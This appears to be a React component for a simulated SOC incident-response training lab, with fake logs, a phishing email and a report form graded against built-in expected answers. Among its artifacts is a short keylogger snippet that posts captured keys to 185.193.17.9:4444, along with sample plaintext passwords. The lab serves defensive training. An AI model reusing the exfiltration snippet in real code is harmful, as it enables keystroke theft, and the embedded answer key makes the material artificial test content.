import { useState } from "react";

/*
  BModule5.jsx
  Advanced SOC Incident Response Lab
*/

export default function BModule5() {

  const [openFile, setOpenFile] = useState("");
  const [report, setReport] = useState({
    user: "",
    phishing: "",
    malware: "",
    ip: "",
    action: ""
  });
  const [result, setResult] = useState("");

  /* ================= ARTIFACTS ================= */

  const FS = {

    "AUTHENTICATION": {
      "users.sql": `
id | username | password
-----------------------
1  | ramesh   | R@mesh2024
2  | suresh   | 123456
3  | anita    | An!ta@99
4  | karthik  | karthik@2024
      `,
      "auth.log": `
10:02 Failed login user=suresh ip=103.21.9.4
10:03 Failed login user=suresh ip=103.21.9.4
10:04 Success login user=suresh ip=103.21.9.4
      `,
      "password_audit.txt": `
User suresh violates password policy.
      `
    },

    "EMAILS": {
      "inbox_suresh.eml": `
From: it-support@secure-company-login.com
To: suresh@company.com
Subject: Password Reset Required

Reset here:
https://secure-company-login.com/reset
      `,
      "newsletter.eml": `
Monthly company updates.
      `
    },

    "HOST": {
      "browser_cache.log": `
Visited URL:
https://secure-company-login.com/reset
      `,
      "downloads.log": `
Downloaded file:
security_update.js
      `,
      "security_update.js": `
setInterval(()=>{
 fetch("http://185.193.17.9:4444/collect",{
  method:"POST",
  body: JSON.stringify(keys)
 })
},3000)
      `
    },

    "NETWORK": {
      "nmap.txt": `
22/tcp open ssh
80/tcp open http
4444/tcp open unknown
      `,
      "netflow.log": `
Outbound traffic:
103.21.9.4 -> 185.193.17.9:4444
      `
    }
  };

  /* ================= SUBMIT ================= */

  const submit = () => {
    const n = v => v.toLowerCase().replace(/[^a-z0-9]/g,"");

    if (
      n(report.user) === "suresh" &&
      n(report.phishing).includes("phish") &&
      n(report.malware).includes("keylog") &&
      n(report.ip).includes("4444") &&
      (
        n(report.action).includes("reset") ||
        n(report.action).includes("block") ||
        n(report.action).includes("revoke")
      )
    ) {
      setResult("INCIDENT ANALYSIS VALIDATED. RESPONSE APPROPRIATE.");
    } else {
      setResult("REPORT INCOMPLETE OR INCORRECT. REVIEW ARTIFACTS.");
    }
  };

  return (
    <div style={S.page}>

      {/* BRIEFING */}
      <div style={S.brief}>
        <h2>Incident Response Simulation</h2>
        <p><b>Role:</b> SOC Analyst</p>
        <p><b>Alert:</b> Weak authentication followed by suspicious activity</p>
        <p>
          Analyze authentication data, user emails, host activity, and
          network evidence to reconstruct the attack and recommend action.
        </p>
      </div>

      {/* DASHBOARD */}
      <div style={S.grid}>

        {/* FILE TREE */}
        <div style={S.tree}>
          {Object.keys(FS).map(section => (
            <div key={section}>
              <div style={S.section}>{section}</div>
              {Object.keys(FS[section]).map(file => (
                <div
                  key={file}
                  style={S.file}
                  onClick={() => setOpenFile(FS[section][file])}
                >
                  {file}
                </div>
              ))}
            </div>
          ))}
        </div>

        {/* VIEWER */}
        <div style={S.viewer}>
          <pre>{openFile || "// Select artifact to inspect"}</pre>
        </div>

      </div>

      {/* INCIDENT REPORT */}
      <div style={S.report}>
        <h3>Incident Report</h3>

        <label>Compromised User</label>
        <input onChange={e=>setReport({...report,user:e.target.value})} />

        <label>How did phishing occur?</label>
        <input onChange={e=>setReport({...report,phishing:e.target.value})} />

        <label>Installed Malware</label>
        <input onChange={e=>setReport({...report,malware:e.target.value})} />

        <label>Suspicious IP / Port</label>
        <input onChange={e=>setReport({...report,ip:e.target.value})} />

        <label>Immediate Security Action</label>
        <input onChange={e=>setReport({...report,action:e.target.value})} />

        <button onClick={submit}>Submit Report</button>

        {result && <div style={S.result}>{result}</div>}
      </div>

    </div>
  );
}

/* ================= STYLES ================= */

const S = {
  page:{background:"#060b12",color:"#00ffcc",minHeight:"100vh",padding:"16px",fontFamily:"monospace"},
  brief:{border:"1px solid #00ffcc",padding:"10px",marginBottom:"10px"},
  grid:{display:"flex",gap:"10px"},
  tree:{width:"30%",border:"1px solid #00ffcc",padding:"8px"},
  section:{marginTop:"6px",fontWeight:"bold"},
  file:{cursor:"pointer",paddingLeft:"10px"},
  viewer:{width:"70%",border:"1px solid #00ffcc",padding:"8px"},
  report:{border:"1px solid #00ffcc",padding:"10px",marginTop:"10px",display:"flex",flexDirection:"column",gap:"6px"},
  result:{marginTop:"6px",fontSize:"12px"}
};
